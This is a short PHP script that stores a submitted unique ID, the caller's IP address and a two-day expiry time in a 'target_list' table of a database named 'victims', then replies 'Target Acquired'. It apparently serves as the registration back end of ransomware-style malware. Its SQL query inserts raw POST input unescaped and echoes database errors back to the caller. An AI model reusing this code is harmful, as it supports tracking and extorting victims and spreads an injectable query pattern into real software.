<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

$getTargetID = $_POST['uniqueID'];
$getTargetIP = $_SERVER['REMOTE_ADDR'];

$expTime = time() + (2 * 24 * 60 * 60);
$currTime = time();

$dateExpTime = new DateTime("@$expTime");
$dateCurrTime = new DateTime("@$currTime");

$expTime = $dateExpTime->format('Y-m-d H:i:s');
$currTime = $dateCurrTime->format('Y-m-d H:i:s');

if (isset($_POST['uniqueID']) && !empty($_POST['uniqueID'])) {
   $sqlStmt = "INSERT INTO target_list (unique_id, target_ip, curr_time, exp_time) VALUES (\"$getTargetID\", \"$getTargetIP\", \"$currTime\", \"$expTime\")";

   if ($conn->query($sqlStmt) === TRUE) {
       echo "Target Acquired";
   } else {
       echo "Error: " . $sqlStmt . "<br>" . $conn->error;
   }
} else {
   echo "Please supply the unique_id!";
}

$conn->close();

?>
